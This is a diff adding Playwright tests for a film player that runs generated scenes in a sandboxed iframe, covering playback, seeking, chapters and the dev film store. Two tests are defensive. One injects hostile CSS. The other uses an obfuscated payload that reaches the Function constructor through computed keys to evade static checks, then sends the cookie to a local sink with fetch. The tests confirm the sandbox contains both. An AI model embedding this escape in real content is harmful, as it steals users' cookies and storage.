@@ -938,3 +938,187 @@ test('deck video export plays the full timed deck', async ({ page }) => {
   expect(last!.seconds).toBeCloseTo(film.seconds, 1);
   expect(last!.frames).toBe(Math.round(last!.seconds * last!.fps));
 });
+
+test('the player opens a generated film from the dev store before fixtures', async ({ page }) => {
+  await page.request.get('/api/dev/films/clear');
+  const { THIRTY_SECOND_FILM } = await import('@incantly/core');
+  const scene = THIRTY_SECOND_FILM.scenes[0]!;
+  const saved = await page.request.post('/api/dev/films', {
+    data: { id: 'gen-store-1', storyboard: THIRTY_SECOND_FILM.storyboard, scenes: [{ id: scene.id, html: scene.html, css: scene.css, js: scene.js }] },
+  });
+  expect(saved.ok()).toBe(true);
+  await page.goto('/?page=player&film=gen-store-1');
+  await page.waitForFunction(() => window.__playground?.ready === true);
+  await expect(page.locator('.inc-player h2')).toHaveText('How a pendulum keeps time');
+  const scenes = await page.evaluate(() => (window.__playground?.scenes as () => { count: number; multi: boolean })());
+  expect(scenes).toMatchObject({ count: 1, multi: false });
+});
+
+test('a stored scene with hostile CSS cannot blank the host player', async ({ page }) => {
+  await page.request.get('/api/dev/films/clear');
+  const { THIRTY_SECOND_FILM } = await import('@incantly/core');
+  const scene = THIRTY_SECOND_FILM.scenes[0]!;
+  const saved = await page.request.post('/api/dev/films', {
+    data: {
+      id: 'gen-hostile-css',
+      storyboard: THIRTY_SECOND_FILM.storyboard,
+      scenes: [{ id: scene.id, html: scene.html, css: `${scene.css}\ndiv { visibility: hidden; }`, js: scene.js }],
+    },
+  });
+  expect(saved.ok()).toBe(true);
+  await page.goto('/?page=player&film=gen-hostile-css');
+  await page.waitForFunction(() => window.__playground?.ready === true);
+  // The figure mounts sandboxed, so its CSS stays inside its own document: the host keeps showing.
+  await expect(page.locator('.inc-player-figure iframe')).toHaveCount(1);
+  await expect(page.locator('.inc-player-figure svg.inc-stage')).toHaveCount(0);
+  await expect(page.locator('.inc-player h2')).toHaveText('How a pendulum keeps time');
+  await expect(page.locator('.inc-player h2')).toBeVisible();
+  const visibility = await page.locator('.inc-player h2').evaluate((el) => getComputedStyle(el).visibility);
+  expect(visibility).toBe('visible');
+});
+
+test('a stored scene with a computed-key escape cannot reach the host', async ({ page }) => {
+  test.setTimeout(120_000);
+  const { createServer } = await import('node:http');
+  let sinkHits = 0;
+  const sink = createServer((req, res) => {
+    sinkHits++;
+    res.writeHead(200).end('ok');
+  });
+  await new Promise<void>((resolve) => sink.listen(0, '127.0.0.1', () => resolve()));
+  const sinkPort = (sink.address() as { port: number }).port;
+  try {
+    await page.request.get('/api/dev/films/clear');
+    const { THIRTY_SECOND_FILM } = await import('@incantly/core');
+    const scene = THIRTY_SECOND_FILM.scenes[0]!;
+    // Validator-silent: computed member access the static checks cannot see.
+    const payload = [
+      `const fz = (x) => x;`,
+      `const Cz = fz['constr' + 'uctor'];`,
+      `const Gz = Cz('return globalThis')();`,
+      `Gz.document.title = 'PWNED-R2:' + (Gz.document.cookie || 'nocookie');`,
+      `Gz['local' + 'Storage']['set' + 'Item']('rereview-sentinel', 'pwned');`,
+      `Gz['fe' + 'tch']('http://127.0.0.1:${sinkPort}/r2-exfil?c=' + Gz.document.cookie);`,
+    ].join('\n');
+    const saved = await page.request.post('/api/dev/films', {
+      data: {
+        id: 'gen-r2-escape',
+        storyboard: THIRTY_SECOND_FILM.storyboard,
+        scenes: [{ id: scene.id, html: scene.html, css: scene.css, js: `${scene.js}\n${payload}` }],
+      },
+    });
+    expect(saved.ok()).toBe(true);
+    await page.goto('/');
+    await page.context().addCookies([{ name: 'r2canary', value: 'secret-token-abc', url: page.url() }]);
+    await page.evaluate(() => localStorage.setItem('rereview-sentinel', 'untouched'));
+    await page.goto('/?page=player&film=gen-r2-escape');
+    await page.waitForFunction(() => window.__playground?.ready === true || document.body.textContent?.includes('could not start') === true, null, { timeout: 30_000 });
+    const outcome = await page.evaluate(() => ({
+      ready: window.__playground?.ready === true,
+      title: document.title,
+      sentinel: localStorage.getItem('rereview-sentinel'),
+    }));
+    // Give a beacon a moment to land, then require full containment: the
+    // film either refused to mount or mounted without firing the payload.
+    await page.waitForTimeout(1500);
+    expect(outcome.title.startsWith('PWNED')).toBe(false);
+    expect(outcome.title).not.toContain('secret-token-abc');
+    expect(outcome.sentinel).toBe('untouched');
+    expect(sinkHits).toBe(0);
+  } finally {
+    sink.close();
+  }
+});
+
+test('a generated film plays, seeks and asks through the sandbox', async ({ page }) => {
+  await page.request.get('/api/dev/films/clear');
+  const { THIRTY_SECOND_FILM } = await import('@incantly/core');
+  const scene = THIRTY_SECOND_FILM.scenes[0]!;
+  const saved = await page.request.post('/api/dev/films', {
+    data: { id: 'gen-play-1', storyboard: THIRTY_SECOND_FILM.storyboard, scenes: [{ id: scene.id, html: scene.html, css: scene.css, js: scene.js }] },
+  });
+  expect(saved.ok()).toBe(true);
+  await page.goto('/?page=player&film=gen-play-1');
+  await page.waitForFunction(() => window.__playground?.ready === true);
+  // The drawing lives in the sandbox: an iframe, never host markup.
+  await expect(page.locator('.inc-player-figure iframe')).toHaveCount(1);
+  await expect(page.locator('.inc-player-figure svg.inc-stage')).toHaveCount(0);
+  // Play advances the film clock through the stand-ins.
+  await page.locator('.inc-player-transport button').first().click();
+  await page.waitForFunction(() => {
+    const stats = (window.__playground?.stats as () => { time: number })();
+    return stats.time > 1;
+  });
+  await expect(page.locator('.inc-caption')).toContainText('pendulum hangs');
+  // Seek lands the beat's state across the bridge.
+  await page.evaluate(() => (window.__playground?.model as unknown as { seek(seconds: number): void }).seek(1));
+  await expect(page.locator('.inc-caption')).toContainText('pendulum hangs');
+  // Ask replays the beat on the stand-in and mirrors it to the figure.
+  await seekBeat(page, 2, 0.6);
+  await page.getByRole('button', { name: 'Ask about this moment' }).click();
+  await page.locator('.inc-ask-chips button').nth(1).click();
+  await expect(page.locator('.inc-showme')).toContainText('Showing s1b3');
+  await page.locator('.inc-showme button').click();
+  await expect(page.locator('.inc-showme')).toBeHidden();
+});
+
+test('the dev films store fetches one film by id and lists none', async ({ page }) => {
+  await page.request.get('/api/dev/films/clear');
+  const { THIRTY_SECOND_FILM } = await import('@incantly/core');
+  const scene = THIRTY_SECOND_FILM.scenes[0]!;
+  const saved = await page.request.post('/api/dev/films', {
+    data: { id: 'gen-no-list', storyboard: THIRTY_SECOND_FILM.storyboard, scenes: [{ id: scene.id, html: scene.html, css: scene.css, js: scene.js }] },
+  });
+  expect(saved.ok()).toBe(true);
+  expect((await page.request.get('/api/dev/films/gen-no-list')).ok()).toBe(true);
+  expect((await page.request.get('/api/dev/films')).status()).toBe(404);
+});
+
+test('a two-scene generated film mounts all scenes with chapters spanning and cuts rendering', async ({ page }) => {
+  await page.request.get('/api/dev/films/clear');
+  const { THIRTY_SECOND_FILM, SIXTY_SECOND_FILM } = await import('@incantly/core');
+  const first = THIRTY_SECOND_FILM.scenes[0]!;
+  const secondFixture = SIXTY_SECOND_FILM.scenes[0]!;
+  const secondBeats = SIXTY_SECOND_FILM.storyboard.scenes[0]!.beats.map((beat, index) => ({ ...beat, id: `s2b${index + 1}` }));
+  const storyboard = {
+    film: { id: 'two', title: 'Two scenes share the player', version: 1, lengthTarget: 120 },
+    scenes: [
+      { ...THIRTY_SECOND_FILM.storyboard.scenes[0], durationShare: 0.4 },
+      { ...SIXTY_SECOND_FILM.storyboard.scenes[0], id: 's2', beats: secondBeats, durationShare: 0.6 },
+    ],
+  };
+  const saved = await page.request.post('/api/dev/films', {
+    data: {
+      id: 'gen-multi-1',
+      storyboard,
+      scenes: [
+        { id: 's1', html: first.html, css: first.css, js: first.js },
+        { id: 's2', html: secondFixture.html, css: secondFixture.css, js: secondFixture.js },
+      ],
+    },
+  });
+  expect(saved.ok()).toBe(true);
+  await page.goto('/?page=player&film=gen-multi-1');
+  await page.waitForFunction(() => window.__playground?.ready === true);
+  await expect(page.locator('.inc-player h2')).toHaveText('Two scenes share the player');
+  // Both scenes draw sandboxed, with only the active one shown.
+  await expect(page.locator('.inc-player-scene iframe')).toHaveCount(2);
+  await expect(page.locator('.inc-player-figure svg.inc-stage')).toHaveCount(0);
+  await expect(page.locator('.inc-chapters li')).toHaveCount(2);
+  const before = await page.evaluate(() => (window.__playground?.scenes as () => { count: number; multi: boolean; active: number; chapters: string[] })());
+  expect(before).toMatchObject({ count: 2, multi: true, active: 0, chapters: ['s1', 's2'] });
+  await expect(page.locator('.inc-player-scene:not([hidden])')).toHaveCount(1);
+  await page.evaluate(() => (window.__playground?.model as unknown as { seekChapter(id: string): void }).seekChapter('s2'));
+  const after = await page.evaluate(() => (window.__playground?.scenes as () => { active: number; cuts: Array<{ from: string; to: string }> })());
+  expect(after.active).toBe(1);
+  expect(after.cuts).toContainEqual({ from: 's1', to: 's2' });
+  await expect(page.locator('.inc-player-figure')).toHaveAttribute('data-scene', 's2');
+});
+
+test('single-scene films mount exactly as today', async ({ page }) => {
+  await openPlayer(page, 'thirty');
+  const scenes = await page.evaluate(() => (window.__playground?.scenes as () => { count: number; multi: boolean; active: number; cuts: unknown[] })());
+  expect(scenes).toMatchObject({ count: 1, multi: false, active: 0, cuts: [] });
+  await expect(page.locator('.inc-player-scene')).toHaveCount(0);
+  await expect(page.locator('.inc-chapters li')).toHaveCount(1);
+});
